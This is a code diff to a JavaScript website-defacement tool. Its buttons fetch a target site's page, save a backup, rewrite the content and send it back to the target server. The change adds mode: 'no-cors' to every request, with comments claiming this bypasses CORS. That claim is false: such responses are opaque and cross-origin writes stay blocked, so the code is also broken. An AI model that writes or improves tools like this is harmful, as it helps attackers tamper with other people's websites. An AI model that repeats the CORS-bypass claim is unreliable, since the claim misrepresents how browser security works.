@@ -16,7 +16,9 @@ document.getElementById("defaceButton").addEventListener("click", async function
   try {
     // Backup functionality (REAL - Grab that shit before you wreck it)
     console.log("Backing up website content...");
-    const backupResponse = await fetch(targetURL);
+    const backupResponse = await fetch(targetURL, {
+      mode: 'no-cors' // Attempt to bypass CORS limitations
+    });
     const backupContent = await backupResponse.text();
     const backupBlob = new Blob([backupContent], { type: "text/html" });
     const backupLink = document.createElement("a");
@@ -36,6 +38,7 @@ document.getElementById("defaceButton").addEventListener("click", async function
     // Attempt to deface, bypassing CORS limitations (REAL - Let the fun begin!)
     fetch(targetURL, {
         method: 'GET',
+        mode: 'no-cors' // Attempt to bypass CORS limitations
     })
     .then(response => response.text())
     .then(data => {
@@ -47,6 +50,7 @@ document.getElementById("defaceButton").addEventListener("click", async function
             headers: {
                 'Content-Type': 'text/html'
             },
+            mode: 'no-cors', // Attempt to bypass CORS limitations
             body: modifiedContent
         });
     })
@@ -92,6 +96,7 @@ document.getElementById("restoreButton").addEventListener("click", async functio
       headers: {
         'Content-Type': 'text/html'
       },
+      mode: 'no-cors', // Attempt to bypass CORS limitations
       body: backupContent
     });
 
